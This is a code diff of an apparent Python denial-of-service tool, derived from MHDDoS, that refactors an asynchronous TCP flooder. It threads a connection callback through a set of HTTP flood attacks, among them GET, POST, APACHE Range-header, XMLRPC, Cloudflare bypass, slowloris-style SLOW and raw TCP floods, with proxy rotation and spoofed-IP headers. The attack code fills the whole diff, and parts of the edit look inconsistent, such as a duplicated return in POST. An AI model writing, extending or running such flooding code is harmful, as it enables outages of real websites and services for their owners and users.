@@ -36,7 +36,6 @@ from .core import cl, logger, ROOT_DIR, Stats
 from .proxies import ProxySet, NoProxySet
 
 from . import proto
-from .concurrency import scale_attack
 from .proto import FloodIO, FloodOp, FloodSpec
 from .referers import REFERERS
 from .useragents import USERAGENTS
@@ -670,10 +669,10 @@ class AsyncTcpFlood(HttpFlood):
         self._loop = loop
         self._settings = settings or AttackSettings()
 
-    async def run(self) -> bool:
+    async def run(self, on_connect=None) -> bool:
         assert self._loop is not None, "Event loop has to be set to run async flooder"
         try:
-            return await self.SENT_FLOOD()
+            return await self.SENT_FLOOD(on_connect=on_connect)
         except OSError as exc:
             if exc.errno == errno.ENOBUFS:
                 await asyncio.sleep(0.1)
@@ -779,7 +778,13 @@ class AsyncTcpFlood(HttpFlood):
         return packets_sent > 0
 
     # XXX: get rid of RPC param when OVH is gone
-    async def _generic_flood_proto(self, payload, *, rpc: Optional[int] = None) -> bool:
+    async def _generic_flood_proto(
+        self,
+        payload,
+        *,
+        on_connect = None,
+        rpc: Optional[int] = None
+    ) -> bool:
         on_close = self._loop.create_future()
         rpc = rpc or self._settings.requests_per_connection
         flood_proto = partial(
@@ -789,6 +794,7 @@ class AsyncTcpFlood(HttpFlood):
             self._stats,
             self._settings,
             FloodSpec.from_any(payload, rpc),
+            on_connect=on_connect,
         )
         is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
         server_hostname = "" if is_tls else None
@@ -812,6 +818,7 @@ class AsyncTcpFlood(HttpFlood):
                 ssl_ctx,
                 downstream_factory=flood_proto,
                 connect_timeout=self._settings.dest_connect_timeout_seconds,
+                on_connect=on_connect,
             )
             conn = self._loop.create_connection(
                 flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
@@ -819,33 +826,40 @@ class AsyncTcpFlood(HttpFlood):
             async with timeout(self._settings.connect_timeout_seconds):
                 await conn
         except asyncio.CancelledError as e:
+            if on_connect:
+                on_connect.cancel()
             on_close.cancel()
+            raise e
+        except Exception as e:
+            if on_connect:
+                on_connect.set_exception(e)
             raise e
         else:
             return bool(await on_close)
 
     # XXX: again, with functions it's just a partial
-    async def GET(self) -> bool:
+    async def GET(self, on_connect=None) -> bool:
         payload: bytes = self.generate_payload()
-        return await self._generic_flood(payload)
+        return await self._generic_flood_proto(payload, on_connect=on_connect)
 
-    async def POST(self) -> bool:
+    async def POST(self, on_connect=None) -> bool:
         payload: bytes = self.generate_payload(
             ("Content-Length: 44\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % Tools.rand_str(32))[:-2]
         return await self._generic_flood(payload)
+        return await self._generic_flood_proto(payload, on_connect=on_connect)
 
-    async def STRESS(self) -> bool:
+    async def STRESS(self, on_connect=None) -> bool:
         payload: bytes = self.generate_payload(
             (f"Content-Length: 524\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % Tools.rand_str(512))[:-2]
-        return await self._generic_flood(payload)
+        return await self._generic_flood_proto(payload, on_connect=on_connect)
 
-    async def COOKIES(self) -> bool:
+    async def COOKIES(self, on_connect=None) -> bool:
         payload: bytes = self.generate_payload(
             "Cookie: _ga=GA%s;"
             " _gat=1;"
@@ -853,14 +867,14 @@ class AsyncTcpFlood(HttpFlood):
             " %s=%s\r\n" %
             (random.randint(1000, 99999), Tools.rand_str(6), Tools.rand_str(32))
         )
-        return await self._generic_flood(payload)
+        return await self._generic_flood_proto(payload, on_connect=on_connect)
 
-    async def APACHE(self) -> bool:
+    async def APACHE(self, on_connect=None) -> bool:
         payload: bytes = self.generate_payload(
             "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
-        return await self._generic_flood(payload)
+        return await self._generic_flood_proto(payload, on_connect=on_connect)
 
-    async def XMLRPC(self) -> bool:
+    async def XMLRPC(self, on_connect=None) -> bool:
         payload: bytes = self.generate_payload(
             ("Content-Length: 345\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
@@ -871,21 +885,23 @@ class AsyncTcpFlood(HttpFlood):
              "</param><param><value><string>%s</string>"
              "</value></param></params></methodCall>") %
             (Tools.rand_str(64), Tools.rand_str(64)))[:-2]
-        return await self._generic_flood(payload)
+        return await self._generic_flood_proto(payload, on_connect=on_connect)
 
-    async def PPS(self) -> bool:
-        return await self._generic_flood(self._defaultpayload)
-
-    async def DYN(self) -> bool:
+    async def PPS(self, on_connect=None) -> bool:
+        # XXX: there's in an issue with this implementation
+        #      default payload should be extended with additional headers
+        return await self._generic_flood_proto(self._defaultpayload, on_connect)
+    
+    async def DYN(self, on_connect=None) -> bool:
         payload: bytes = str.encode(
             self._payload +
             "Host: %s.%s\r\n" % (Tools.rand_str(6), self._target.authority) +
             self.randHeadercontent +
             "\r\n"
         )
-        return await self._generic_flood(payload)
-
-    async def GSB(self) -> bool:
+        return await self._generic_flood_proto(payload, on_connect)
+    
+    async def GSB(self, on_connect) -> bool:
         payload: bytes = str.encode(
             "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                           self._target.raw_path_qs,
@@ -904,9 +920,9 @@ class AsyncTcpFlood(HttpFlood):
             'Pragma: no-cache\r\n'
             'Upgrade-Insecure-Requests: 1\r\n\r\n'
         )
-        return await self._generic_flood(payload)
-
-    async def NULL(self) -> bool:
+        return await self._generic_flood_proto(payload, on_connect)
+    
+    async def NULL(self, on_connect=None) -> bool:
         payload: bytes = str.encode(
             self._payload +
             "Host: %s\r\n" % self._target.authority +
@@ -914,15 +930,16 @@ class AsyncTcpFlood(HttpFlood):
             "Referrer: null\r\n" +
             self.SpoofIP + "\r\n"
         )
-        return await self._generic_flood(payload)
+        return await self._generic_flood_proto(payload, on_connect)
 
-    @scale_attack(factor=3)
-    async def BYPASS(self) -> bool:
+    async def BYPASS(self, on_connect=None) -> bool:
         connector = self._proxies.pick_random_connector()
         packets_sent = 0
         cl_timeout = aiohttp.ClientTimeout(connect=self._settings.connect_timeout_seconds)
         async with aiohttp.ClientSession(connector=connector, timeout=cl_timeout) as s:
             self._stats.track_open_connection()  # not exactly the connection though
+            if not on_connect.cancelled():
+                on_connect.set_result(True)
             try:
                 for _ in range(self._settings.requests_per_connection):
                     async with s.get(self._target.human_repr()) as response:
@@ -935,8 +952,7 @@ class AsyncTcpFlood(HttpFlood):
                 self._stats.track_close_connection()
         return packets_sent > 0
 
-    @scale_attack(factor=2)
-    async def CFBUAM(self) -> bool:
+    async def CFBUAM(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
 
@@ -949,34 +965,32 @@ class AsyncTcpFlood(HttpFlood):
                 if time() > deadline:
                     return
 
-        return await self._generic_flood_proto(_gen())
+        return await self._generic_flood_proto(_gen(), on_connect=on_connect)
 
-    @scale_attack(factor=5)
-    async def EVEN(self) -> bool:
-        payload: bytes = self.generate_payload()
-        packets_sent, packet_size = 0, len(payload)
-        reader, writer = await self.open_connection()
-        try:
+    async def EVEN(self, on_connect=None) -> bool:
+        packet: bytes = self.generate_payload()
+        packet_size: int = len(packet)
+
+        def _gen():
             for _ in range(self._settings.requests_per_connection):
-                await self._send_packet(writer, payload)
-                packets_sent += 1
+                yield FloodOp.WRITE, (packet, packet_size)
                 # XXX: have to setup buffering properly for this attack to be effective
-                async with timeout(self._settings.tcp_read_timeout_seconds):
-                    await reader.read(1)
-        finally:
-            await self._close_connection(writer)
-        return packets_sent > 0
+                yield FloodOp.READ, 1
 
-    async def OVH(self) -> int:
+        return await self._generic_flood_proto(_gen(), on_connect=on_connect)
+
+    async def OVH(self, on_connect=None) -> int:
         payload: bytes = self.generate_payload()
         # XXX: we might want to remove this attack as we don't really
         #      track cases when high number of packets on the same connection
         #      leads to IP being blocked
-        return await self._generic_flood(
-            payload, rpc=min(self._settings.requests_per_connection, 5))
+        return await self._generic_flood_proto(
+            payload,
+            rpc=min(self._settings.requests_per_connection, 5),
+            on_connect=on_connect
+        )
 
-    @scale_attack(factor=5)
-    async def AVB(self) -> bool:
+    async def AVB(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
         delay: float = max(self._settings.requests_per_connection / 1000, 1)
@@ -986,10 +1000,9 @@ class AsyncTcpFlood(HttpFlood):
                 yield FloodOp.SLEEP, delay
                 yield FloodOp.WRITE, (packet, packet_size)
 
-        return await self._generic_flood_proto(_gen())
+        return await self._generic_flood_proto(_gen(), on_connect=on_connect)
 
-    @scale_attack(factor=20)
-    async def SLOW(self) -> bool:
+    async def SLOW(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
         delay: float = self._settings.requests_per_connection / 15
@@ -1007,10 +1020,9 @@ class AsyncTcpFlood(HttpFlood):
                 yield FloodOp.WRITE, (keep, len(keep))
                 yield FloodOp.SLEEP, delay
 
-        return await self._generic_flood_proto(_gen())
+        return await self._generic_flood_proto(_gen(), on_connect=on_connect)
 
-    @scale_attack(factor=20)
-    async def DOWNLOADER(self) -> bool:
+    async def DOWNLOADER(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
         delay: float = self._settings.requests_per_connection / 15
@@ -1029,11 +1041,12 @@ class AsyncTcpFlood(HttpFlood):
                     #         https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L910
             yield FloodOp.WRITE, (b'0', 1)
 
-        return await self._generic_flood_proto(_gen())
+        return await self._generic_flood_proto(_gen(), on_connect=on_connect)
 
-    async def TCP(self) -> bool:
+    async def TCP(self, on_connect=None) -> bool:
         packet_size = 1024
-        return await self._generic_flood(partial(randbytes, packet_size))
+        return await self._generic_flood_proto(
+            partial(randbytes, packet_size), on_connect=on_connect)
 
 
 class AsyncUdpFlood(Layer4):
